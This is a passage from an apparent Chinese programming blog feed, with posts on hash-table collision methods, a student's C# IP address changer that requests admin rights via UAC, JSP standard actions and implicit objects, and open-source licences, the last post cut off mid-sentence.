title="3.2、链地址法（拉链法）"></a>3.2、链地址法（拉链法）</h3><p>将所有具有相同哈希地址的而不同关键字的数据元素连接到同一个单链表中。如果选定的哈希表长度为<code>m</code>，则可将哈希表定义为一个有<code>m</code>个头指针组成的指针数组<code>T[0..m-1]</code>，凡是哈希地址为<code>i</code>的数据元素，均以节点的形式插入到<code>T[i]</code>为头指针的单链表中。并且新的元素插入到链表的前端（通常新插入的元素可能不久又会被访问）。</p><p><strong>特点：</strong></p><ul><li>处理冲突简单，且无堆积现象，即非同义词决不会发生冲突，因此平均查找长度较短；</li><li>由于各链表上的节点空间是动态申请的，因此它更适合于造表前无法确定表长的情况； </li><li>开放定址法为减少冲突，要求装填因子<code>α</code>较小，故当结点规模较大时会浪费很多空间，而拉链法中可取<code>α≥1</code>，且结点较大时，拉链法中增加的指针域可忽略不计，因此节省空间； </li><li>删除结点的操作易于实现，只要简单地删去链表上相应的结点即可。对于使用开放定址法构造的散列表，删除结点不能简单地将被删节点的空间置为空，否则将截断在它之后填入哈希表的同义词节点的查找路径。这是因为在开放定址法中，空地址单元(即开放地址)都是查找失败的条件。因此在用开放定址法处理冲突的散列表上执行删除操作，只能在被删结点上做删除标记，而不能真正删除结点。</li></ul><h3 id="3-3、再哈希法（二次哈希法）"><a href="#3-3、再哈希法（二次哈希法）" class="headerlink" title="3.3、再哈希法（二次哈希法）"></a>3.3、再哈希法（二次哈希法）</h3><p>同时构造多个不同的哈希函数： <code>Func1 = RH1(key)</code>  ， <code>Func2 = RH2(key)</code> ，当<code>Func1 = RH1(key)</code>  发生冲突时，再用<code>Func2 = RH2(key)</code> 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。</p><h2 id="四、平均查找长度计算"><a href="#四、平均查找长度计算" class="headerlink" title="四、平均查找长度计算"></a>四、平均查找长度计算</h2><h3 id="4-1、公式"><a href="#4-1、公式" class="headerlink" title="4.1、公式"></a>4.1、公式</h3><table><thead><tr><th align="center">处理冲突的方法</th><th align="center">平均查找长度【查找成功】</th><th align="center">平均查找长度【查找失败】</th></tr></thead><tbody><tr><td align="center">线性探测法</td><td align="center">$S_(nl) \approx \frac{1}{2}(1+\frac{1}{1-\alpha})$</td><td align="center">$U_(nl) \approx \frac{1}{2}(1+\frac{1} {(1-\alpha)^2})$</td></tr><tr><td align="center">二次探测法和双哈希法</td><td align="center">$S_(nr) \approx-\frac{1}{\alpha}\ln(1-\alpha)$</td><td align="center">$U_(nr) \approx \frac{1}{1-\alpha}$</td></tr><tr><td align="center">链地址法</td><td align="center">$S_(nc) \approx 1+\frac{\alpha}{2}$</td><td align="center">$U_(nc) \approx \alpha + e^{-\alpha} $</td></tr></tbody></table><h3 id="4-2、示例"><a href="#4-2、示例" class="headerlink" title="4.2、示例"></a>4.2、示例</h3><p>假设散列表的长度是<code>13</code>，散列函数为<code>H(K) = k % 13</code>，给定的关键字序列为<code>{32， 14， 23， 01， 42， 20， 45， 27， 55， 24， 10， 53}</code>。分别画出用线性探测法和拉链法解决冲突时构造的哈希表，并求出在等概率情况下，这两种方法的查找成功和查找不成功的平均查找长度。</p><h4 id="4-2-1、线性探测法"><a href="#4-2-1、线性探测法" class="headerlink" title="4.2.1、线性探测法"></a>4.2.1、线性探测法</h4><p><img src="/assets/images/hash-linear-detection.png" alt="线性探测法计算" loading="lazy"></p><h4 id="4-2-2、链地址法"><a href="#4-2-2、链地址法" class="headerlink" title="4.2.2、链地址法"></a>4.2.2、链地址法</h4><p><img src="/assets/images/hash-chain-address.png" alt="链地址法计算" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 哈希表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用C#编写的一个IP地址修改器</title>
      <link href="/2017/01/05/ip-address-modifier/"/>
      <url>/2017/01/05/ip-address-modifier/</url>
      
        <content type="html"><![CDATA[<h2 id="一、编写初衷："><a href="#一、编写初衷：" class="headerlink" title="一、编写初衷："></a>一、编写初衷：</h2><p>在学校的时候很多时候需要更改自己电脑的IP地址，比如机房课程设计的时候，拔掉机房的网线插到自己电脑上的时候，每次都得配上机房的IP地址，下午下课回去后还得自己更改为自动获取IP地址，很是烦人。之后我曾经用过BAT的方式去修改电脑的IP地址等信息，之前用起来效果也十分不错，但是毕竟添加IP地址等信息还得去编辑BAT，也不是十分方便，对于一些小白用户来说多少也是个麻烦事，并且之前的那个BAT需要手动以管理员方式运行，也比较麻烦，为此打算用C#写一个小程序，方便的来改变电脑的IP地址等信息。</p><h2 id="二、软件详细介绍："><a href="#二、软件详细介绍：" class="headerlink" title="二、软件详细介绍："></a>二、软件详细介绍：</h2><p>该IPAddressModifier软件使用Microsoft Visual Studio 2015这款IDE使用C#进行编写，整体上只设计了两个窗体，一个是当前网络适配器详情以及预览预设置IP地址等信息的窗体，还有一个是针对预选IP地址等信息的操作窗体，整体的耗时大概一周左右，其实时间应该是两周左右，因为中间有一些考试，我还需要好好复习一下，所以一共做的时间应该是一周左右，因为本人C#的技能并不是很好，也想把这次当作C#的一次复习，所以就是边查边做了。开始进入界面，并详细介绍。</p><h3 id="2-1、第一个窗体截图如下："><a href="#2-1、第一个窗体截图如下：" class="headerlink" title="2.1、第一个窗体截图如下："></a>2.1、第一个窗体截图如下：</h3><p><img src="/assets/images/ip-address-modifier-1.jpg" alt="Main Interface" loading="lazy"></p><p>打开这个窗体的时候需要使用管理员权限打开，打开时会有该软件需要管理员权限等的提示，然后就针对“管理员权限”这一点详细说明一下；之前我是在<code>app.manifest</code>中修改后的如下代码启用管理员权限：</p><figure class="highlight c#"><table><tr><td class="code"><pre><code class="hljs C#">&lt;requestedExecutionLevel  level=<span class="hljs-string">&quot;requireAdministrator&quot;</span> uiAccess=<span class="hljs-string">&quot;false&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>因为我当初的想法是将这个软件打包发行，但是后来出现的问题是VS无法在这种情况下打包，总是出现类似于“ClickOnce”之类的错误，我尝试按照网络上一些人的建议进行修改，最后仍然会出现这种错误，最后使用在<code>Program.cs</code>文件中的设置修改如下代码完成管理员权限的赋予：</p><figure class="highlight c#"><table><tr><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span><br>        &#123;<br>            <span class="hljs-comment">//Application.EnableVisualStyles();</span><br>            <span class="hljs-comment">//Application.SetCompatibleTextRenderingDefault(false);</span><br>            <span class="hljs-comment">//Application.Run(new IPAddressModifier());</span><br>            Application.EnableVisualStyles();<br>            Application.SetCompatibleTextRenderingDefault(<span class="hljs-literal">false</span>);<br><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 当前用户是管理员的时候，直接启动应用程序</span><br><span class="hljs-comment">             * 如果不是管理员，则使用启动对象启动程序，以确保使用管理员身份运行</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">//获得当前登录的Windows用户标示</span><br>            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();<br>            System.Security.Principal.WindowsPrincipal principal = <span class="hljs-keyword">new</span> System.Security.Principal.WindowsPrincipal(identity);<br>            <span class="hljs-comment">//判断当前登录用户是否为管理员</span><br>            <span class="hljs-keyword">if</span> (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))<br>            &#123;<br>                <span class="hljs-comment">//如果是管理员，则直接运行</span><br>                Application.Run(<span class="hljs-keyword">new</span> IPAddressModifier());<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-comment">//创建启动对象</span><br>                System.Diagnostics.ProcessStartInfo startInfo = <span class="hljs-keyword">new</span> System.Diagnostics.ProcessStartInfo();<br>                startInfo.UseShellExecute = <span class="hljs-literal">true</span>;<br>                startInfo.WorkingDirectory = Environment.CurrentDirectory;<br>                startInfo.FileName = Application.ExecutablePath;<br>                <span class="hljs-comment">//设置启动动作,确保以管理员身份运行</span><br>                startInfo.Verb = <span class="hljs-string">&quot;runas&quot;</span>;<br>                <span class="hljs-keyword">try</span><br>                &#123;<br>                    System.Diagnostics.Process.Start(startInfo);<br>                &#125;<br>                <span class="hljs-keyword">catch</span><br>                &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">//退出</span><br>                Application.Exit();<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="2-2、第二个窗体截图如下："><a href="#2-2、第二个窗体截图如下：" class="headerlink" title="2.2、第二个窗体截图如下："></a>2.2、第二个窗体截图如下：</h3><p><img src="/assets/images/ip-address-modifier-2.jpg" alt="IP Info Interface" loading="lazy"></p><p>这个窗体中主要就是对于网络适配器的预选信息进行增加删除修改操作，需要说明的是，这些信息全部存放在本机的<code>C:\Windows\IPInfo.txt</code>中，也可以自己手动去更改其中的信息，这其中的知识点就是C#对于文件的读写操作。</p><p>需要说的一点是，在这个窗体中所做的修改会同时同步到第一个窗体中的下面的网络适配器目标信息的combox中，这里使用的方法如下：</p><p>第一个窗体中的代码如下：（重点代码以作注释标注）</p><figure class="highlight c#"><table><tr><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IPAddressModifier ipWindow = <span class="hljs-literal">null</span>;<span class="hljs-comment">//重点</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">IPAddressModifier</span>()</span><br>        &#123;<br>            InitializeComponent();<br>            ipWindow = <span class="hljs-keyword">this</span>;<span class="hljs-comment">//重点</span><br>        &#125;<br>        <span class="hljs-built_in">string</span>[,] adapterinfo=<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">20</span>,<span class="hljs-number">10</span>];<span class="hljs-comment">//存放网卡信息的二维数组</span><br>        <span class="hljs-built_in">string</span>[,] toadapterinfo = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">20</span>, <span class="hljs-number">10</span>];<span class="hljs-comment">//存放目标网卡信息的二维数组</span><br>        <span class="hljs-built_in">int</span> adapter_i=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">string</span> adapterid=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-built_in">string</span> path= <span class="hljs-string">&quot;C:\\Windows\\IPInfo.txt&quot;</span>;<span class="hljs-comment">//存放ip信息的路径</span><br>        adapterFile adapterF;<br>        <span class="hljs-comment">//adapterFile窗体通过此方法更新adapterInfoToText的combox的items      [重点方法]</span><br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update_adapterInfoToText</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> i,<span class="hljs-built_in">int</span> j,<span class="hljs-built_in">int</span> inum,<span class="hljs-built_in">string</span> str</span>)</span><br>        &#123;<br>            <span class="hljs-comment">//MessageBox.Show(i.ToString()+&quot;dadad&quot;);</span><br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j==<span class="hljs-number">0</span>)<br>            &#123;<br>                adapterInfoToText.Items.Clear();<span class="hljs-comment">//先清空，添加items之前必须清空一次</span><br>                adapterInfoToText.Items.Add(toadapterinfo[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]);<br>                toadapterinfo[i + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>] = str;<br>                adapterInfoToText.Items.Add(toadapterinfo[i + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                toadapterinfo[i + <span class="hljs-number">1</span>, j] = str;<br>                <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>)<br>                &#123;<br>                    adapterInfoToText.Items.Add(toadapterinfo[i + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i == inum<span class="hljs-number">-1</span>)<br>            &#123;<br>                adapterListText.SelectedIndex = <span class="hljs-number">0</span>;<br>                adapterInfoToText.SelectedIndex = <span class="hljs-number">0</span>;<br>                changeColor(<span class="hljs-string">&quot;black&quot;</span>);<br>                <span class="hljs-keyword">try</span><br>                &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> n = <span class="hljs-number">0</span>; n &lt; <span class="hljs-number">7</span>; n++)<br>                    &#123;<br>                        changeText(n, adapterinfo[<span class="hljs-number">0</span>, n]);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> &#123; &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>第二个窗体中的调用代码如下：</p><figure class="highlight c#"><table><tr><td class="code"><pre><code class="hljs C#">IPAddressModifier.ipWindow.update_adapterInfoToText(i, j, ipnum, adapter_info[i, j].ToString());<br></code></pre></td></tr></table></figure><h1 id="结束语："><a href="#结束语：" class="headerlink" title="结束语："></a>结束语：</h1><p>其实最初的想法并没有那么复杂，只是想写一个软件来修改IP地址等信息就好了，但是出于本人的有点强迫症，这个坑感觉越挖越有点大，截止到目前为止，其实还有好多坑没填上，比如挖坑的时候还想要这个软件能够获取出所有禁用的和启用的网卡，但是目前为止只能获取到已经启用的网卡；当初还想要可以对网卡进行禁用或启用操作，现在也还没实现，但是说实话我感觉现在已经弄得很不错了，代码我已经放在<a href="https://github.com/CUBEGWZ/IPAddressModifier">GitHub</a> 上了，希望大家能够多提意见，改进一下这款软件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP标准动作-JSP笔记-7</title>
      <link href="/2016/12/14/jsp-7/"/>
      <url>/2016/12/14/jsp-7/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><h3 id="1-1、JavaBean的含义："><a href="#1-1、JavaBean的含义：" class="headerlink" title="1.1、JavaBean的含义："></a>1.1、JavaBean的含义：</h3><ul><li><p>JavaBean是一种java语言写成的可复用组件。</p></li><li><p>它是一种特殊的java类，特殊性如下：</p><ul><li>类必须是具体的和公共的；</li><li>具有无参数的构造方法；</li><li>这种方法的访问属性必须是public的，并且方法的命名也必须遵守一定的命名规范。</li></ul></li></ul><h3 id="1-2、JavaBean的优点："><a href="#1-2、JavaBean的优点：" class="headerlink" title="1.2、JavaBean的优点："></a>1.2、JavaBean的优点：</h3><ul><li><p>提高代码的可复用性；</p></li><li><p>程序易于开发维护；</p></li><li><p>可以跨平台；</p></li></ul><h3 id="1-3、JavaBean的使用："><a href="#1-3、JavaBean的使用：" class="headerlink" title="1.3、JavaBean的使用："></a>1.3、JavaBean的使用：</h3><ul><li>标准动作用于：<ul><li>将JavaBean嵌入JSP页面；</li><li>设置和获取JavaBean的属性</li><li>将用户请求转发给其他页面</li><li>将其他用户的内容嵌入当前页面</li></ul></li><li>标准动作中的属性区分大小写。</li><li>JSP中的标准动作使用<jsp>作为前缀。</li><li>JSP可使用JSP标准动作调用JavaBean组件并访问属性。</li></ul><h1 id="Java标准动作包括："><a href="#Java标准动作包括：" class="headerlink" title="Java标准动作包括："></a>Java标准动作包括：</h1><ol><li><code>&lt;jsp:useBean&gt;</code></li><li><code>&lt;jsp:setProperty&gt;</code></li><li><code>&lt;jsp:getProperty&gt;</code></li><li><code>&lt;jsp:forward&gt;</code></li><li><code>&lt;jsp:include&gt;</code></li></ol><h2 id="useBean动作："><a href="#useBean动作：" class="headerlink" title="useBean动作："></a>useBean动作：</h2><ol><li><a href="jsp:useBean">jsp:useBean</a>标签用于在指定的域范围内查找指定名称的JavaBean对象：</li></ol><ul><li>如果存在则直接返回该JavaBean对象的引用；</li><li>如果不存在则实例化一个新的JavaBean对象并将它以制定的名称存储到指定的与范围内。</li></ul><ol start="2"><li>常用语法：</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:useBean id=<span class="hljs-string">&quot;beanName&quot;</span> class=<span class="hljs-string">&quot;package.class&quot;</span> scope=<span class="hljs-string">&quot;page|request|session|application&quot;</span> /&gt;<br><br><span class="hljs-comment">//id属性用于指定JavaBean实话对象的引用名称和气存储在域范围中的名称。</span><br><span class="hljs-comment">//class属性用于指定JavaBean的完整类名(即必须带有包名)。</span><br><span class="hljs-comment">//scope属性用于指定JavaBean实例对象所存储的域范围，其值只能是page、request、session和application等四个值中的一个，其默认值是page。</span><br></code></pre></td></tr></table></figure><p>关于<code>scope</code>属性中的域范围的描述如下：</p><ol><li>Page – Bean只能自啊使用页面时使用(仅涵盖使用JavaBean的页面)。当加载新页面，就会将其销毁(pageBean.jsp&#x2F;MyBean.java)</li><li>Request – 有效范围仅限于使用JavaBean的请求(requestBean.jsp&#x2F;MyBean.java)</li><li>Session – 有效范围在用户整个连接过程中(整个会话过程均有效)(sessionBean.jsp&#x2F;MyBean.java)</li><li>Application – 有效范围涵盖整个应用程序。也就是对整个网站均有效。(applicationBean1.jsp applicationBean2.jsp&#x2F;MyBean.java)</li></ol><p>##补充：Get()和Set()方法：<br>Get()和Set()方法用于访问JavaBean的属性</p><ol><li>Get()方法：定义了共有方法，Get()方法返回值；</li><li>Set()方法：定义了共有方法，Set()方法给属性赋值；</li></ol><h2 id="setProperty动作："><a href="#setProperty动作：" class="headerlink" title="setProperty动作："></a>setProperty动作：</h2><ol><li><a href="jsp:setProperty">jsp:setProperty</a>标签用于设置JavaBean对象的属性。</li><li>语法结构如下：</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:setProperty name=<span class="hljs-string">&quot;beanName&quot;</span><br>&#123;<br>property=<span class="hljs-string">&quot;propertyName&quot;</span> value=<span class="hljs-string">&quot;&#123;string | &lt;%= expression %&gt;&#125;&quot;</span> | property=<span class="hljs-string">&quot;propertyName&quot;</span> [param=<span class="hljs-string">&quot;parameterName&quot;</span>] | property=<span class="hljs-string">&quot;*&quot;</span><br>&#125;/&gt;<br><br><span class="hljs-comment">//name 属性用于指定JavaBean对象的名称。</span><br><span class="hljs-comment">//property 属性用于指定JavaBean实例对象的属性名</span><br><span class="hljs-comment">//value 属性用于指定JavaBean对象的某个属性的值，value的值可以是字符串，也可以是表达式。为字符串时，该值会自动转化为JavaBean属性相应的类型，如果value的值是一个表达式，那么该表达式的计算结果必须与所要设置的JavaBean属性的类型一致。</span><br><span class="hljs-comment">//param属性用于将JavaBean实例对象的某个属性值设置为一个请求参数值，该属性值同样会自动转换成要设置的JavaBean属性的类型。</span><br></code></pre></td></tr></table></figure><h2 id="getProperty动作："><a href="#getProperty动作：" class="headerlink" title="getProperty动作："></a>getProperty动作：</h2><ol><li><a href="jsp:getProperty">jsp:getProperty</a>标签用于读取JavaBean对象的属性，也就是调用JavaBean对象的getter方法，然后将读取的属性值转换成字符串后插入进输出的响应正文中。</li><li>语法格式为：</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:getProperty name=<span class="hljs-string">&quot;beanInstanceName&quot;</span> property=<span class="hljs-string">&quot;PropertyName&quot;</span> /&gt;<br><br><span class="hljs-comment">//name 属性用于指定JavaBean实例对象的名称，其值应该与&lt;jsp:useBean&gt;标签的id属性值相同。</span><br><span class="hljs-comment">//property属性用于指定JavaBean实力对象的属性名。</span><br></code></pre></td></tr></table></figure><ol start="3"><li>如果一个JavaBean实例对象的某个属性的值为null，那么，使用<code>&lt;jsp:getProperty&gt;</code>标签输出该属性的结果将是一个内容为”null”的字符串。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP隐式对象-JSP笔记-6</title>
      <link href="/2016/12/11/jsp-6/"/>
      <url>/2016/12/11/jsp-6/</url>
      
        <content type="html"><![CDATA[<h2 id="一、关于JSP隐式对象"><a href="#一、关于JSP隐式对象" class="headerlink" title="一、关于JSP隐式对象"></a>一、关于JSP隐式对象</h2><ul><li><p>JSP饮食对象是web容器加载的一组类的实例。</p></li><li><p>它不像一般的java对象那样用”new”去获取实例，而是可以直接在jsp页面的java程序片和表达式部分使用对象。</p></li><li><p>jsp使用java定义的隐式对象来访问网页的动态内容。</p></li><li><p>隐式对象的名称是jsp的保留字。</p></li><li><p>jsp提供了一些隐式对象可简化开发。</p></li></ul><blockquote><p>注：这里我们主要体验这些JSP隐式对象的作用范围。</p></blockquote><ol><li>对象的作用域是可以访问对象的部分；</li><li>JSP页面中的隐式对象的作用域包括：</li></ol><ul><li>page – 再引用对象的JSP页面中提供对象。</li><li>Request – 提供在所有请求页面中可用的对象。</li><li>Session – 提供对象已访问给顶应用程序中的所有网页。例如，用户访问一个网站，并通过访问其他链接打开网站中的其他页面。网站中的所有网页形成一个应用程序作用域。</li></ul><ol start="3"><li>作用于通信对象和控制对象用于访问给定作用域中可用的所有对象。</li></ol><h2 id="二、四种隐式对象："><a href="#二、四种隐式对象：" class="headerlink" title="二、四种隐式对象："></a>二、四种隐式对象：</h2><ol><li>输入&#x2F;输出对象：</li></ol><ul><li>request</li><li>response</li><li>out</li></ul><ol start="2"><li>作用域通信对象：</li></ol><ul><li>session</li><li>application</li><li>pageContext</li></ul><ol start="3"><li>Servlet对象</li></ol><ul><li>page</li><li>config</li></ul><ol start="4"><li>错误对象</li></ol><ul><li>exception</li></ul><h3 id="2-1、输入-输出对象："><a href="#2-1、输入-输出对象：" class="headerlink" title="2.1、输入&#x2F;输出对象："></a>2.1、输入&#x2F;输出对象：</h3><ol><li>控制页面的输入和输出</li><li>访问与所有请求和响应有关的数据</li><li>输入和输出对象包括request，response和out</li></ol><h3 id="2-2、request对象"><a href="#2-2、request对象" class="headerlink" title="2.2、request对象"></a>2.2、request对象</h3><p>客户端请求，此请求会包含来自GET&#x2F;POST请求的参数；用户输入的数据用来保存在Request对象中，用javax.servlet.HttpServlet来执行。<code>request对象的作用范围只在本页</code>，跳转页面后之前的设置信息失效。部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;body&gt;<br>    &lt;%<br>request.setAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;zhangsan&quot;</span>) ;<br>    request.setAttribute(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>) ;<br>    <span class="hljs-comment">//request.removeAttribute(&quot;name&quot;);</span><br>    %&gt;<br>    &lt;jsp:forward page=<span class="hljs-string">&quot;request1.jsp&quot;</span>/&gt;<br>&lt;a href=<span class="hljs-string">&quot;&lt;%=path %&gt;/first/request1.jsp&quot;</span>&gt;request1.jsp&lt;/a&gt;<br>  &lt;/body&gt;<br></code></pre></td></tr></table></figure><h3 id="2-3、response对象"><a href="#2-3、response对象" class="headerlink" title="2.3、response对象"></a>2.3、response对象</h3><p>处理jsp生成的响应；响发送给客户端；实现javax.servlet.http.HttpServletResponse接口；jsp引擎吧存放在request对象中的数据发到服务器端的组件，组件收到这些个数据后进行相应处理；返回一个response对象给jsp引擎，jsp引擎再把response对象传给jsp页面，这时的页面包含了定好的格式和从服务器端得到的数据。<code>response的作用范围仍然局限于本页面</code>。</p><h3 id="2-4、out对象"><a href="#2-4、out对象" class="headerlink" title="2.4、out对象"></a>2.4、out对象</h3><p>表示输出流(注意不是response.getWriter(),因为这种是PrintWriter类型)；javax.servlet.jsp.JspWriter类的实例；使用write()、print()、和println()方法；Write()和print()方法的区别是<code>Write只能输出和字符相关的东西，而print()可以输出各种那个数据类型</code>。</p><h2 id="三、作用域通信对象"><a href="#三、作用域通信对象" class="headerlink" title="三、作用域通信对象"></a>三、作用域通信对象</h2><h3 id="3-1、session对象"><a href="#3-1、session对象" class="headerlink" title="3.1、session对象"></a>3.1、session对象</h3><p>Web服务器为单个用户发送的多个请求创建会话；存储有关用户会话的所有信息；javax.servlet.http.HttpSession接口的实例；<code>session对象的作用范围在跳转页面后仍然有效</code>。</p><h3 id="3-2、application对象"><a href="#3-2、application对象" class="headerlink" title="3.2、application对象"></a>3.2、application对象</h3><p>表示jsp页面所属的应用程序；应用程序的jsp页面组合起来形成一个应用程序，适用范围最广的上下文状态。它允许jsp页面的servlet与包括在同一应用程序中的任何web组件共享信息；javax.servlet.ServletContext接口实例。<code>application对象的作用范围在跳转页面后失效</code>。</p><h3 id="3-3、pageContext对象"><a href="#3-3、pageContext对象" class="headerlink" title="3.3、pageContext对象"></a>3.3、pageContext对象</h3><p>使用户可以访问页面作用域中定义的所有隐式对象；他的作用范围是在同一页面；javax.servlet.jsp.PageContext类的实例；是jsp页面本身的上下文；提供唯一一个API来管理具有不同作用域的属性；在实现jsp自定义标记处理程序时使用的非常多；<code>pageContext对象的作用范围在跳转页面后仍然有效</code>。</p><h2 id="四、Servlet对象"><a href="#四、Servlet对象" class="headerlink" title="四、Servlet对象"></a>四、Servlet对象</h2><p>JSP引擎为每个JSP生成一个Servlet；Servlet的对象提供了访问Servlet信息的方法和变量；Servlet对象包括：page和config。</p><h3 id="4-1、page对象"><a href="#4-1、page对象" class="headerlink" title="4.1、page对象"></a>4.1、page对象</h3><p>使用page对象可以访问Servlet类的所有变量和方法；java.lang.Object类的</p><h3 id="4-2、page对象"><a href="#4-2、page对象" class="headerlink" title="4.2、page对象"></a>4.2、page对象</h3><p>存储在便宜JSP页面的过程中刚创建的信息；javax.servlet.ServletConfig接口的实例；提供了检索Servlet的初始化参数的方法；</p><h2 id="五、Exception对象"><a href="#五、Exception对象" class="headerlink" title="五、Exception对象"></a>五、Exception对象</h2><p>exception对象用于处理JSP页面中的错误；exception对象用于访问执行JSP的过程中引发的异常；exception对象是java.lang.Throwable类的实例；</p>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见代码许可证对比</title>
      <link href="/2016/12/10/licence/"/>
      <url>/2016/12/10/licence/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>目前主流的许可证为GPL、LGPL、AGPL、MIT、Apache、BSD、Mozilla</p><h2 id="二、协议类别"><a href="#二、协议类别" class="headerlink" title="二、协议类别"></a>二、协议类别</h2><h3 id="GPL"><a href="#GPL" class="headerlink" title="GPL"></a>GPL</h3><p>GPL全称为<code>GNU General Public License</code>（GNU通用公共许可协议），缩写为<code>GNU GPL</code> 或 <code>GPL</code>，<code>GPL</code> 保证了所有开发者的权利，同时为使用者提供了足够的复制，分发，修改的权利，但是新增代码只能使用相同的许可证。</p><p>目前GPL协议存在三个不同的版本，关于不同版本的详细协议内存，请参考：<a href="%5Bhttps://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv1%5D(https://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv1)">GPL V1</a>、<a href="%5Bhttps://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv2%5D(https://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv2)">GPL V2</a>、<a href="%5Bhttps://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv3%5D(https://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv3)">GPL V3</a></p><p><strong>采用该协议的代表作品</strong>：EMACS、部分Linux核心代码、GCC</p><h3 id="LGPL"><a href="#LGPL" class="headerlink" title="LGPL"></a>LGPL</h3><p><code>LGPL</code>的全称为<code>GNU Lesser General Public License</code>（GNU 宽通用公共许可证），旧称为<code>GNU Library General Public License</code>（GNU 库通用公共许可证）。允许商业软件通过类库引用（link）方式使用LGPL类库而不需要开源商业软件的代码。这使得采用LGPL协议的开源代码可以被商业软件作为类库引用并发布和销售。</p><p><strong>采用该协议的代表作品</strong>：Checkstyle、GTK等</p><h3 id="MIT"><a href="#MIT" class="headerlink" title="MIT"></a>MIT</h3><p><code>MIT</code>全称为<code>The MIT License</code>（MIT许可协议），又称<code>X License</code>（X许可协议）或 <code>X11 License</code>（X11许可协议），MIT 协议是所有开源许可中最宽松的一个，除了必须包含许可声明外，再无任何限制，核心条款如下：</p><p>该软件及其相关文档对所有人免费，可以任意处置，包括使用，复制，修改，合并，发表，分发，再授权，或者销售。唯一的限制是，软件中必须包含上述版 权和许可提示，这意味着：</p><ul><li>你可以自由使用，复制，修改，可以用于自己的项目；</li><li>可以免费分发或用来盈利；</li><li>唯一的限制是必须包含许可声明；</li></ul><p><strong>采用该协议的代表作品</strong>：PuTTY、X Window、Expat、Ruby on Rails、Lua等</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p><code>Apache</code>全称为<code>Apache License</code>（Apache许可证），兼容<code>GPL V3</code>，<code>Apache 协议 2.0</code> 和别的开源协议相比，除了为用户提供版权许可之外，还有专利许可。Apache 